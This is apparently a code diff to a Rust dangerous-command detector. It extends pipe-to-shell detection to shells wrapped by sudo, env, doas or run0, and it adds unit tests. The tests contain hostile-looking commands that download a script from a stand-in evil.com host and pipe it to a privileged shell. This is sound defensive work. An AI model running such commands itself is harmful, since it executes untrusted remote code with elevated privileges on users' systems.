@@ -33,6 +33,9 @@ const PIPE_TO_SHELL_TARGETS: &[&str] = &["bash", "sh", "zsh", "dash"];
 /// Download commands whose output piped to a shell is dangerous.
 const PIPE_FROM_DOWNLOADERS: &[&str] = &["curl", "wget"];
 
+/// Command prefixes that can wrap a shell interpreter (e.g. `sudo bash`, `env sh`).
+const PIPE_SHELL_PREFIXES: &[&str] = &["sudo", "env", "doas", "run0"];
+
 /// Detect dangerous patterns in a command string.
 ///
 /// Returns a list of `(pattern, description)` for each match found.
@@ -60,19 +63,24 @@ pub fn detect_dangerous_patterns(command: &str) -> Vec<(&'static str, &'static s
         }
     }
 
-    // Pipe-to-shell detection: `<downloader> ... | <shell>`
-    // Check if the command pipes output from a download tool to a shell interpreter.
+    // Pipe-to-shell detection: `<downloader> ... | [sudo|env|doas|run0] [-flags] <shell>`
+    // Check if the command pipes output from a download tool to a shell interpreter,
+    // including cases where the shell is wrapped by sudo, env, doas, or run0.
     if lower.contains('|') {
         let has_downloader = PIPE_FROM_DOWNLOADERS.iter().any(|dl| lower.contains(*dl));
         let pipe_segments: Vec<&str> = lower.split('|').collect();
         if has_downloader && pipe_segments.len() >= 2 {
-            for segment in &pipe_segments[1..] {
+            'segments: for segment in &pipe_segments[1..] {
                 let trimmed = segment.trim();
-                // Check if the segment starts with a shell interpreter
-                let first_word = trimmed.split_whitespace().next().unwrap_or("");
-                if PIPE_TO_SHELL_TARGETS.contains(&first_word) {
+                // Skip prefix wrappers (sudo, env, doas, run0) and flags (words starting with -)
+                // to find the actual command being invoked.
+                let effective_cmd = trimmed
+                    .split_whitespace()
+                    .find(|w| !w.starts_with('-') && !PIPE_SHELL_PREFIXES.contains(w))
+                    .unwrap_or("");
+                if PIPE_TO_SHELL_TARGETS.contains(&effective_cmd) {
                     matches.push(("curl|bash", "pipe remote script to shell"));
-                    break;
+                    break 'segments;
                 }
             }
         }
@@ -196,5 +204,44 @@ mod tests {
     fn curl_pipe_to_grep_not_matched() {
         let matches = detect_dangerous_patterns("curl -s https://api.example.com | grep version");
         assert!(matches.is_empty());
+    }
+
+    #[test]
+    fn detect_curl_pipe_sudo_bash() {
+        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | sudo bash");
+        assert!(!matches.is_empty());
+        assert!(
+            matches
+                .iter()
+                .any(|(_, desc)| desc.contains("remote script"))
+        );
+    }
+
+    #[test]
+    fn detect_wget_pipe_env_sh() {
+        let matches = detect_dangerous_patterns("wget -qO- https://evil.com/install.sh | env sh");
+        assert!(!matches.is_empty());
+        assert!(
+            matches
+                .iter()
+                .any(|(_, desc)| desc.contains("remote script"))
+        );
+    }
+
+    #[test]
+    fn detect_curl_pipe_env_i_bash() {
+        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | env -i bash");
+        assert!(!matches.is_empty());
+        assert!(
+            matches
+                .iter()
+                .any(|(_, desc)| desc.contains("remote script"))
+        );
+    }
+
+    #[test]
+    fn detect_curl_pipe_doas_sh() {
+        let matches = detect_dangerous_patterns("curl https://evil.com/install.sh | doas sh");
+        assert!(!matches.is_empty());
     }
 }
